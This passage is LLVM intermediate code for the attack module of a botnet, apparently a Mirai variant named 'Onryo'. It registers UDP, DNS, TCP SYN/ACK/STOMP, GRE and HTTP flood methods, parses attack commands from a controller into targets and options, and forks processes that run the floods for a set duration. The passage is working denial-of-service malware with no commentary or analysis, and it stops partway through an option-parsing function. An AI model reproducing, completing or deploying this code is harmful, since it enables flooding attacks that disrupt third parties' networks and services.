; ModuleID = 'host/ir_O0/Onryo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00", align 16
@table = common global [81 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 3
  br i1 %4, label %5, label %24

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2

; <label>:24:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %219

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %17
  br label %219

; <label>:31:                                     ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %31
  br label %219

; <label>:42:                                     ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  br label %219

; <label>:54:                                     ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %54
  br label %219

; <label>:62:                                     ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 %64, i64 24) #6
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

; <label>:67:                                     ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

; <label>:72:                                     ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67

; <label>:117:                                    ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %117
  br label %219

; <label>:122:                                    ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %211

; <label>:133:                                    ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 %135, i64 16) #6
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

; <label>:138:                                    ; preds = %207, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %210

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %143
  br label %219

; <label>:148:                                    ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %148
  br label %219

; <label>:165:                                    ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %165
  br label %219

; <label>:178:                                    ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 %182, i64 1) #6
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  call void @util_memcpy(i8* %194, i8* %195, i32 %197)
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = load i8*, i8** %3, align 8
  %201 = sext i32 %199 to i64
  %202 = getelementptr inbounds i8, i8* %200, i64 %201
  store i8* %202, i8** %3, align 8
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = load i32, i32* %4, align 4
  %206 = sub nsw i32 %205, %204
  store i32 %206, i32* %4, align 4
  br label %207

; <label>:207:                                    ; preds = %178
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  br label %138

; <label>:210:                                    ; preds = %138
  br label %211

; <label>:211:                                    ; preds = %210, %122
  %212 = call i32* @__errno_location() #7
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* %6, align 4
  %214 = load i8, i8* %7, align 1
  %215 = load i8, i8* %8, align 1
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = load i8, i8* %9, align 1
  %218 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %213, i8 zeroext %214, i8 zeroext %215, %struct.attack_target* %216, i8 zeroext %217, %struct.attack_option* %218)
  br label %219

; <label>:219:                                    ; preds = %211, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %220 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %221 = icmp ne %struct.attack_target* %220, null
  br i1 %221, label %222, label %225

; <label>:222:                                    ; preds = %219
  %223 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %224 = bitcast %struct.attack_target* %223 to i8*
  call void @free(i8* %224) #6
  br label %225

; <label>:225:                                    ; preds = %222, %219
  %226 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %227 = icmp ne %struct.attack_option* %226, null
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %225
  %229 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i32
  call void @free_opts(%struct.attack_option* %229, i32 %231)
  br label %232

; <label>:232:                                    ; preds = %228, %225
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %70

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %70

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %15, align 4
  br label %37

; <label>:70:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %36

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10

; <label>:33:                                     ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* %35) #6
  br label %36

; <label>:36:                                     ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11

; <label>:38:                                     ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

; <label>:40:                                     ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
